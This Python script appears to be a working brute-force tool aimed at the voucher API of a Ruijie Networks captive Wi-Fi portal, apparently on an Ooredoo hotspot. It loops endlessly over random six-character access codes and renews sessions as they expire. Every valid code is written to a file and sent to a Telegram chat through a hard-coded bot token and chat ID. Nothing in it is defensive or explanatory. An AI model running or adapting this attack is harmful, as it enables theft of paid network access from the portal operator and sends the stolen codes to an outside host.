import requests
import random
import string
import time
import urllib.parse
from urllib.parse import urlparse, parse_qs
import telebot

# Telegram Bot Token & Chat ID (Replace with actual values)
TELEGRAM_BOT_TOKEN = '8057302563:AAHP3pluJYyNDDlWrDVjoc9uuzTmZW-4uCw'
CHAT_ID = '5671920054'

# Function to get a new session ID
def get_new_session():
    api_url = 'https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=10823d4c6157&gw_sn=G1SK22H000659&gw_address=192.168.7.1&gw_port=2060&ip=192.168.7.241&mac=96:a5:f2:e6:ae:4d&slot_num=0&nasip=10.104.15.222&ssid=VLAN7&ustate=0&mac_req=0&url=https%3A%2F%2Fooredoo%2Ecom%2Emm%2Fportal%2Fen%2Fbuypacks%3Fk%3D7129&chap_id=%5C033&chap_challenge=%5C175%5C113%5C131%5C351%5C124%5C357%5C002%5C213%5C320%5C015%5C004%5C166%5C253%5C160%5C102%5C226'
    
    response = requests.get(api_url, allow_redirects=False)
    redirect_url = response.headers.get("Location")

    if not redirect_url:
        print(" Error: No redirect URL found.")
        return None

    parsed_url = urlparse(redirect_url)
    query_params = parse_qs(parsed_url.query)
    session_id = query_params.get('sessionId', [None])[0]

    if not session_id:
        print(" Error: sessionId not found.")
        return None

    print(f" New session ID obtained: {session_id}")  # Print session ID for debugging
    return session_id

# Initialize Telebot
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Function to send access code to Telegram
def send_code_to_telegram(code):
    bot.send_message(CHAT_ID, f" Valid Access Code: {code}")

# File to store valid access codes
output_file = "codes.txt"

# User selects access code format
print("Choose the access code format:")
print("1 - Numbers (0-9)")
print("2 - Lowercase letters (a-z)")
print("3 - Numbers and lowercase letters (0-9, a-z)")
print("4 - Custom character set (Enter manually)")

choice = input("Enter your choice (1/2/3/4): ")

if choice == '1':
    char_range = string.digits
elif choice == '2':
    char_range = string.ascii_lowercase
elif choice == '3':
    char_range = string.ascii_lowercase + string.digits
elif choice == '4':
    char_range = input("Enter your custom character set: ")
else:
    print("Invalid choice. Exiting.")
    exit(1)

# Start Session ID
session_id = get_new_session()
if not session_id:
    print("Failed to obtain session ID. Exiting.")
    exit(1)

# Cookies for session
cookies = {
    '_clck': '163b1wn%7C2%7Cfs0%7C0%7C1820',
    '_gcl_au': '1.1.271739863.1735099201',
    '_lfa': 'LF1.1.158765ae06dab1fc.1735099203445',
    '_fbp': 'fb.1.1735099203714.111500295180928563',
    '_ga': 'GA1.2.1256420044.1735098830',
}

# Headers for API requests
headers = {
    'authority': 'portal-as.ruijienetworks.com',
    'accept': '*/*',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://portal-as.ruijienetworks.com',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

# API query parameters
params = {'lang': 'en_US'}

# Loop to generate and test codes
attempts = 0

while True:
    access_code = ''.join(random.choices(char_range, k=6))

    print(f" Using session ID: {session_id}")  # Print the session ID before each request

    # JSON payload
    json_data = {
        'accessCode': access_code,
        'sessionId': session_id,
        'apiVersion': 1,
    }

    # Send request
    try:
        response = requests.post(
            'https://portal-as.ruijienetworks.com/api/auth/voucher/',
            params=params,
            cookies=cookies,
            headers=headers,
            json=json_data,
            timeout=2  # Increased timeout for better handling
        )
        response.raise_for_status()

        # Print details
        print(f"Attempt {attempts + 1}:")
        print(f"Access Code: {access_code}")
        print(f"Response Status Code: {response.status_code}")
        print(f"Response Body: {response.text}\n")

        # Handle responses
        if "true" in response.text:
            # Save valid code
            with open(output_file, "a") as file:
                file.write(f"{access_code}\n")

            print(f" Access code {access_code} saved.")
            send_code_to_telegram(access_code)
        
        elif "Session timed out" in response.text:
            print(" Session expired. Fetching a new session ID...")
            session_id = get_new_session()
            if not session_id:
                print(" Could not renew session. Exiting.")
                break  # Exit if session renewal fails
            continue  # Retry with a new session ID

    except requests.exceptions.RequestException as e:
        print(f" Request failed: {e}")

    # Increment attempts
    attempts += 1

    # Optional delay to prevent rate limiting
    time.sleep(1)  # Adjust this based on server response rate